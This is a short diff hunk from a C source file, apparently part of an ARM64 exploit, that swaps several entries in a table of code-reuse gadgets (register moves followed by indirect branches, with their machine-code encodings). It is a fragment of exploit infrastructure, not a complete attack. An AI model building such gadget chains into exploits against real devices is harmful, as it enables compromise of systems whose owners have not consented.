@@ -203,16 +203,16 @@ struct static_gadget static_gadgets[] = {
 	                                        0x3cc382e0, 0xf94026ea, 0xa9025bf5, 0xf9000fea,
 	                                        0x3c8083e0, 0xf90003e9, 0xaa1303e0, 0xaa1403e1,
 	                                        0xd63f0100),
-	//MOV_X19_X10__BR_X8
-	GADGET("mov x19, x10 ; br x8",          0xaa0a03f3, 0xd61f0100),
+	//MOV_X19_X4__BR_X8
+	GADGET("mov x19, x4 ; br x8",           0xaa0403f3, 0xd61f0100),
 	//MOV_X20_X7__BR_X8
 	GADGET("mov x20, x7 ; br x8",           0xaa0703f4, 0xd61f0100),
 	//MOV_X23_X6__BLR_X8
 	GADGET("mov x23, x6 ; blr x8",          0xaa0603f7, 0xd63f0100),
-	//MOV_X24_X4__BLR_X8
-	GADGET("mov x24, x4 ; blr x8",          0xaa0403f8, 0xd63f0100),
-	//MOV_X8_X3__BR_X9
-	GADGET("mov x8, x3 ; br x9",            0xaa0303e8, 0xd61f0120),
+	//MOV_X24_X0__BLR_X8
+	GADGET("mov x24, x0 ; blr x8",          0xaa0003f8, 0xd63f0100),
+	//MOV_X8_X10__BR_X9
+	GADGET("mov x8, x10 ; br x9",           0xaa0a03e8, 0xd61f0120),
 };
 #undef GADGET
 
